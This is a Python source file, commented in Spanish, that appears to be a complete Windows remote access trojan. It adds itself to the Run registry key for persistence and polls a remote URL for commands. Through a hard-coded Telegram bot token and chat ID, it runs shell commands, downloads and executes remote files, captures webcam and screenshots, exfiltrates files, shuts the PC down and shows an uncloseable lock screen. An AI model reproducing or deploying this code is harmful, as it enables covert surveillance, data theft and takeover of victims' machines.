import requests
import subprocess
import os
import time
import tempfile
from PIL import ImageGrab
import io
import threading
import tkinter as tk
import webbrowser
import win32api
import win32con
import sys
import cv2

# Agregar script a la lista de programas que se ejecutan al inicio
def add_to_startup():
    try:
        # Ruta al ejecutable
        exe_path = os.path.abspath(sys.executable)

        # Ruta al script
        script_path = os.path.abspath(_file_)

        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(key, 'mi_programa', 0, win32con.REG_SZ, f'"{exe_path}" "{script_path}"')
        win32api.RegCloseKey(key)
        print('Script agregado a la lista de programas que se ejecutan al inicio con éxito')
    except Exception as e:
        print(f'Error al agregar script a la lista de programas que se ejecutan al inicio: {e}')

add_to_startup()

# ------------------------------
# CONFIGURACIÓN
# ------------------------------
URL = "http://undercraft.netlify.app/resources/bt/ins.txt"
CHECK_INTERVAL = 1
TOKEN = "7989936031:AAGVEnNu3jwlGJoU3sWFfGnphukfvlYJUtA"
CHAT_ID = "8359793070"
last_command = ""

# Ventana de bloqueo LOCK
lock_window = None

# ------------------------------
# FUNCIONES
# ------------------------------
def download_file(path: str):
    """Envía un archivo local al bot via Telegram"""
    try:
        if not os.path.exists(path):
            send_telegram(f"[DOWNLOAD] El archivo no existe: {path}")
            return
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": (os.path.basename(path), f)},
                timeout=20
            )
        send_telegram(f"[DOWNLOAD] Archivo enviado: {path}")
    except Exception as e:
        send_telegram(f"[ERROR DOWNLOAD] {e}")

def open_url(url: str):
    try:
        webbrowser.open(url)
        send_telegram(f"[OPENURL] Abierto: {url}")
    except Exception as e:
        send_telegram(f"[ERROR OPENURL] {e}")

def webcam_captura(ip_objetivo: str):
    try:
        # Obtener IP pública real
        try:
            mi_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        except:
            mi_ip = "0.0.0.0"
        
        # Solo ejecutar si la IP coincide
        if mi_ip != ip_objetivo:
            return  # No es la máquina indicada
        
        # Capturar la webcam
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if not ret:
            send_telegram(f"[WEBCAM ERROR] No se pudo acceder a la cámara en {mi_ip}")
            cap.release()
            return
        
        # Guardar imagen
        cv2.imwrite("captura.jpg", frame)
        cap.release()
        
        # Enviar archivo a Telegram
        with open("captura.jpg", "rb") as f:
            send_telegram_file(f.read(), "captura.jpg")
        os.remove("captura.jpg")
        send_telegram(f"[WEBCAM] Captura realizada por {mi_ip}")
    except Exception as e:
        send_telegram(f"[ERROR WEBCAM] {e}")

def dlexec(url: str):
    """Descarga un archivo desde URL y lo ejecuta automáticamente."""
    try:
        send_telegram(f"[DLEXEC] Descargando: {url}")
        r = requests.get(url, timeout=20)
        if r.status_code != 200:
            send_telegram("[DLEXEC ERROR] No se pudo descargar el archivo.")
            return
        # archivo temporal con la extensión correcta
        nombre = url.split("/")[-1]
        fd, temp_path = tempfile.mkstemp(suffix=f"_{nombre}")
        with os.fdopen(fd, "wb") as f:
            f.write(r.content)
        send_telegram(f"[DLEXEC] Archivo guardado como {temp_path}, ejecutando...")
        # Ejecutar
        subprocess.Popen(
            [temp_path],
            shell=True
        )
        send_telegram("[DLEXEC] Ejecutado correctamente.")
    except Exception as e:
        send_telegram(f"[DLEXEC ERROR] {e}")

def send_telegram(msg: str):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": msg},
            timeout=10
        )
    except Exception as e:
        print(f"[ERROR Telegram] {e}")

def send_telegram_file(file_bytes: bytes, filename: str):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendDocument",
            files={"document": (filename, file_bytes)},
            data={"chat_id": CHAT_ID},
            timeout=15
        )
    except Exception as e:
        print(f"[ERROR Telegram File] {e}")

def ejecutar_tell(mensaje: str):
    try:
        subprocess.Popen(
            ["cmd.exe", "/k", f"echo {mensaje}"],
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
    except Exception as e:
        print(f"[ERROR TELL] {e}")

def apagar_pc():
    try:
        if os.name == "nt":
            os.system("shutdown /s /t 0")
        else:
            os.system("shutdown now")
    except Exception as e:
        print(f"[ERROR OFF] {e}")

def insexe(url: str):
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            fd, path = tempfile.mkstemp(suffix=".exe")
            with os.fdopen(fd, "wb") as f:
                f.write(r.content)
            subprocess.Popen(
                [path],
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )
    except Exception as e:
        print(f"[ERROR INSEXE] {e}")

def enviar_ip_publica():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception as e:
        ip = f"No disponible ({e})"
    send_telegram(f"IP PUBLICA DEL CLIENTE: {ip}")

def ejecutar_cmd(comando: str):
    try:
        output = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT)
        output_text = output.decode(errors="ignore")
        send_telegram(f"CMD RESULTADO:\n{output_text}")
    except Exception as e:
        send_telegram(f"ERROR CMD: {e}")

def screenshot_telegram():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        send_telegram_file(buf.read(), "screenshot.png")
    except Exception as e:
        send_telegram(f"[ERROR SCREENSHOT] {e}")

# ------------------------------
# LOCK (pantalla completa bloqueada)
# ------------------------------
def lock_screen(mensaje: str, activar: bool):
    global lock_window
    if activar:
        if lock_window is not None:
            return  # ya está bloqueado

        def run_lock():
            global lock_window
            lock_window = tk.Tk()
            send_telegram(f"EL DIPOSITIVO {ip} fue bloqueado")
            lock_window.attributes("-fullscreen", True)
            lock_window.attributes("-topmost", True)
            lock_window.configure(bg="black")
            # Esto evita cerrar con la X o ALT+F4
            lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
            label = tk.Label(
                lock_window,
                text=mensaje,
                fg="white",
                bg="black",
                font=("Arial", 28)
            )
            label.pack(expand=True)
            lock_window.mainloop()

        threading.Thread(target=run_lock, daemon=True).start()
    else:
        try:
            if lock_window is not None:
                lock_window.destroy()
                lock_window = None
        except:
            pass

# ------------------------------
# NOTIFICACIÓN DE INICIO
# ------------------------------
try:
    ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
except:
    ip = "IP no disponible"
send_telegram(f"Cliente iniciado y conectado ✅ {ip}")

# ------------------------------
# LOOP PRINCIPAL
# ------------------------------
while True:
    try:
        r = requests.get(URL, timeout=5)
        comando = r.text.strip()
        if comando != "" and comando != last_command:
            last_command = comando
            cmd_upper = comando.upper()
            # TELL --mensaje--
            if cmd_upper.startswith("TELL --") and cmd_upper.endswith("--"):
                mensaje = comando[7:-2].strip()
                ejecutar_tell(mensaje)
            # IP
            elif cmd_upper == "IP":
                enviar_ip_publica()
            elif cmd_upper.startswith("WEBCAM --CAPTURAR --IP "):
                 ip_objetivo = comando[23:].strip()
                 webcam_captura(ip_objetivo)
            # OFF
            elif cmd_upper == "OFF":
                apagar_pc()
            # INSEXE URL
            elif cmd_upper.startswith("INSEXE "):
                url = comando[7:].strip()
                insexe(url)
            # CMD --comando--
            elif cmd_upper.startswith("CMD --") and cmd_upper.endswith("--"):
                cmd_text = comando[6:-2].strip()
                ejecutar_cmd(cmd_text)
            # SCREENSHOT
            elif cmd_upper == "SCREENSHOT":
                screenshot_telegram()
            # LOCK=true --mensaje--
            elif cmd_upper.startswith("LOCK="):
                activar = "TRUE" in cmd_upper
                if "--" in comando:
                    mensaje = comando.split("--", 1)[1].strip()
                else:
                    mensaje = "PANTALLA BLOQUEADA"
                lock_screen(mensaje, activar)
            elif cmd_upper.startswith("DLEXEC "):
                url = comando[7:].strip()
                dlexec(url)
            elif cmd_upper.startswith("OPENURL "):
                url = comando[8:].strip()
                open_url(url)
            elif cmd_upper.startswith("DOWNLOAD "):
                path = comando[9:].strip()
                download_file(path)
            else:
                print(f"[INFO] Comando no reconocido: {comando}")
    except Exception as e:
        print(f"[ERROR LOOP] {e}")
    time.sleep(CHECK_INTERVAL)